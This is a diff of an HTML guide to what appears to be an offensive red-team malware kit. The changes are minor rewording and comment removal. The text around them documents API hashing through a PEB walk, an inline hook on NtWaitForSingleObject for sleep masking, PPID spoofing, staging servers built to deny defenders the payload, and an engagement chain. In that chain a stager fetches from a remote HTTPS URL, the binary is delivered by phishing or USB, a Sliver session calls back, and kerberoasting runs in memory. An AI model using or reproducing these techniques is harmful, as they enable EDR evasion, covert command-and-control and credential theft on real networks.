@@ -431,14 +431,11 @@ sub   rax, 5     ; rax = shellcode base address
 ; Then scan forward in C for the MAGIC marker to find the config block.</code></pre>
 
           <h4>API Resolution &mdash; ROR13 PEB Walk</h4>
-<pre><code class="language-c">// No strings, no IAT — just hash constants
-uint32_t h = 0;
+<pre><code class="language-c">uint32_t h = 0;
 while (*name) {
-    h = (h &gt;&gt; 13) | (h &lt;&lt; 19);   // rotate right 13
+    h = (h &gt;&gt; 13) | (h &lt;&lt; 19);
     h += (uint8_t)(*name++);
-}
-// "NtWaitForSingleObject" → 0xAE06C1B2
-// "NtCreateThreadEx"      → 0x4D1DEB74</code></pre>
+}</code></pre>
 
           <h4>The Inline Hook</h4>
           <p>The masker writes a 12-byte JMP trampoline over the first 12 bytes of <code>NtWaitForSingleObject</code> in ntdll. A separate 32-byte trampoline buffer (in the masker&rsquo;s own RX memory) holds the displaced original bytes plus a <code>JMP</code> back to <code>(ntdll_stub + 12)</code> &mdash; so <code>_real_NtWaitForSingleObject</code> behaves identically to the unhooked function.</p>
@@ -1013,7 +1010,7 @@ UpdateProcThreadAttribute(attr, 0,
 STARTUPINFOEXW si = { .lpAttributeList = attr };
 CreateProcessW(L"RuntimeBroker.exe", ...,
     CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, ..., &si, &pi);</code></pre>
-          <p>The kernel records <code>explorer.exe</code> as the parent PID. That is what Sysmon Event ID 1, Process Explorer, and EDR process-tree views all read via <code>NtQueryInformationProcess</code>. Worth noting: spoofing the PPID does not change the security token (it is still your user&rsquo;s token, not explorer&rsquo;s) and kernel audit events will record the real creator. It fools the process tree view, not a forensic deep-dive.</p>
+          <p>The kernel records <code>explorer.exe</code> as the parent PID. That is what Sysmon Event ID 1, Process Explorer, and EDR process-tree views all read via <code>NtQueryInformationProcess</code>. Spoofing the PPID does not change the security token (it is still your user&rsquo;s token, not explorer&rsquo;s) and kernel audit events record the real creator. It fools the process tree view, not a forensic investigation.</p>
 
           <h3>6.6 Evasion Techniques</h3>
 
@@ -1178,7 +1175,7 @@ make all</code></pre>
           <p>All four kits use the same staging primitive: a self-signed ECDSA P-256 HTTPS server on a random URL path, configured to shut down 500 ms after the first successful download. Defenders who pull the URL from network logs and replay get a 404 &mdash; the payload is unrecoverable. Each rebuild generates a fresh URL and a fresh key.</p>
 
           <h3>7.5 Position-Independent Code</h3>
-          <p>Every shellcode artifact is fully PIC: REL32 relocations resolved at link time, RIP-relative addressing in code, no PE headers, no relocation directory. The blob runs identically wherever it&rsquo;s loaded in memory, which makes downstream chaining (process injection, sleep masking) trivial.</p>
+          <p>Every shellcode artifact is fully PIC: REL32 relocations resolved at link time, RIP-relative addressing in code, no PE headers, no relocation directory. The blob runs identically wherever it&rsquo;s loaded in memory, so chaining it through a process injector or sleep masker requires no additional fixup.</p>
 
           <h2 id="engagement-chain">8. Full Engagement Chain</h2>
           <p><em>Scenario: Initial access on a workstation. You want a persistent, evasive Sliver session inside a legitimate process, with memory scanning protection on every sleep cycle and redundant session capability.</em></p>
@@ -1223,7 +1220,7 @@ cd Inject-Kit/injectkit
 #   injectkit.exe -mode stager -url https://192.168.1.10:8443/a3f91c04b2e8d17f \
 #                 -key a1b2c3d4... -spawn RuntimeBroker.exe -ppid explorer.exe</code></pre>
           <p>Deliver <code>injectkit.exe</code> to the target via phishing, exploit, or USB &mdash; whatever gave initial access. Run the printed command.</p>
-          <p><code>RuntimeBroker.exe</code> appears in the process tree under <code>explorer.exe</code>. Its memory contains the PalaceKit shellcode &rarr; which decrypts and runs the MaskKit masker &rarr; which decrypts and runs Sliver. Callback arrives. <strong>First session established.</strong></p>
+          <p><code>RuntimeBroker.exe</code> appears in the process tree under <code>explorer.exe</code>. Its memory contains the PalaceKit shellcode, which decrypts and runs the MaskKit masker, which decrypts and runs Sliver. The session calls back.</p>
 
           <h3>8.3 Phase 3 &mdash; Tool Execution in Session (LoadKit)</h3>
           <p>You&rsquo;re in the session. Run Rubeus kerberoasting without writing to disk:</p>
